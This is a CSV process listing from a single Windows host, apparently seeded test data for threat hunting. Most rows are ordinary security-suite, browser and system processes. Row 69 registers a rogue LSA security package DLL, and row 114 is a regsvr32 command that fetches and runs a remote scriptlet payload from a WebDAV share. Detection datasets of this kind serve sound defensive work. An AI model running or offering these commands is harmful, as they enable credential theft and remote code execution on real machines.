,arguments,hostname,name,path,pid,username
16,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0004FXGWS,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,5083,mat.robinson7
17,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0004FXGWS,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,5427,mat.robinson7
18,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0004FXGWS,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,3185,mat.robinson7
19,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",0004FXGWS,UIHost.exe,C:\Program Files\McAfee\WebAdvisor,5360,mat.robinson7
21,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0004FXGWS,opera.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,2859,ambe.alexand52
22,"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",0004FXGWS,KeePassXC.exe,C:\Program Files\KeePassXC,601,mat.robinson7
24,"""C:\Users\mat.robinson7\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0004FXGWS,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\mat.robinson7\AppData\Local\Temp\scoped_dir9616_4071,4400,mat.robinson7
25,C:\Windows\system32\svchost.exe -k LocalService,0004FXGWS,svchost.exe,C:\Windows\system32,2576,NT AUTHORITY\SYSTEM
26,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,0004FXGWS,svchost.exe,C:\Windows\system32,6056,NT AUTHORITY\SYSTEM
28,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0004FXGWS,McDiReg.exe,C:\ProgramData\McAfee\Direct,2472,mat.robinson7
29,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",0004FXGWS,opera.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,1722,ambe.alexand52
30,C:\Windows\system32\svchost.exe -k NetworkService,0004FXGWS,svchost.exe,C:\Windows\system32,3744,NT AUTHORITY\SYSTEM
32,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,0004FXGWS,svchost.exe,C:\Windows\system32,256,NT AUTHORITY\SYSTEM
35,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0004FXGWS,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,3580,mat.robinson7
37,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0004FXGWS,opera.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,4211,ambe.alexand52
39,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,0004FXGWS,svchost.exe,C:\Windows\System32,3892,NT AUTHORITY\SYSTEM
40,winlogon.exe,0004FXGWS,winlogon.exe,C:\Windows\system32,3072,NT AUTHORITY\SYSTEM
41,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0004FXGWS,opera.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,833,ambe.alexand52
42,"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",0004FXGWS,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,5281,kyl.sanders
43,C:\Windows\system32\lsass.exe,0004FXGWS,lsass.exe,C:\Windows\system32,6332,NT AUTHORITY\SYSTEM
44,C:\Windows\Explorer.EXE,0004FXGWS,Explorer.EXE,C:\Windows,3424,NT AUTHORITY\SYSTEM
45,C:\Windows\System32\svchost.exe -k termsvcs,0004FXGWS,svchost.exe,C:\Windows\System32,1384,NT AUTHORITY\SYSTEM
46,"""LogonUI.exe"" /flags:0x0",0004FXGWS,LogonUI.exe,C:\Windows\system32,2816,NT AUTHORITY\SYSTEM
47,C:\Windows\system32\wbem\wmiprvse.exe,0004FXGWS,wmiprvse.exe,C:\Windows\system32\wbem,512,NT AUTHORITY\SYSTEM
48,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0004FXGWS,opera.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,2438,ambe.alexand52
50,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0004FXGWS,McPvTray.exe,C:\Program Files\McAfee\MAT,2946,mat.robinson7
56,"""dwm.exe""",0004FXGWS,dwm.exe,C:\Windows\system32,1260,NT AUTHORITY\SYSTEM
58,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0004FXGWS,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,535,mat.robinson7
59,taskhostex.exe ,0004FXGWS,taskhostex.exe,C:\Windows\system32,3108,NT AUTHORITY\SYSTEM
64,C:\Windows\system32\svchost.exe -k RPCSS,0004FXGWS,svchost.exe,C:\Windows\system32,3848,NT AUTHORITY\SYSTEM
66,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0004FXGWS,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,3090,mat.robinson7
69,C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\lsacc.dll,0004FXGWS,reg.exe,C:\Windows\System32\reg.exe,5980,ambe.alexand52
73,"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",0004FXGWS,soffice.exe,C:\Program Files (x86)\OpenOffice 4\program,302,kyl.sanders
76,C:\Windows\System32\svchost.exe -k utcsvc,0004FXGWS,svchost.exe,C:\Windows\System32,5904,NT AUTHORITY\SYSTEM
77,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0004FXGWS,opera.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,1183,ambe.alexand52
78,"""C:\Users\sophicarter30\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0004FXGWS,OneDrive.exe,C:\Users\sophicarter30\AppData\Local\Microsoft\OneDrive,338,sophicarter30
80,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0004FXGWS,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,4476,mat.robinson7
82,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0004FXGWS,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,6292,mat.robinson7
84,"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",0004FXGWS,soffice.bin,C:\Program Files (x86)\OpenOffice 4\program,2091,kyl.sanders
86,"""dwm.exe""",0004FXGWS,dwm.exe,C:\Windows\system32,3188,NT AUTHORITY\SYSTEM
87,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0004FXGWS,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,1650,mat.robinson7
88,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0004FXGWS,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,5056,mat.robinson7
89,"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",0004FXGWS,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,618,kyl.sanders
90,,0004FXGWS,DisplaySwitch.exe,C:\Windows\System32\DisplaySwitch.exe,4484,NT AUTHORITY\SYSTEM
94,"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,0004FXGWS,cmd.exe,C:\WINDOWS\system32,3391,iankel
98,"""C:\Ruby24-x64\bin\ruby.exe"" ",0004FXGWS,ruby.exe,C:\Ruby24-x64\bin,2224,iankel
114,C:\Windows\System32\regsvr32 /u /n /s /i:\webdavserver\folder\payload.sct scrobj.dll,0004FXGWS,wscript.exe,C:\Windows\System32\wscript.exe,2040,ivy.hil
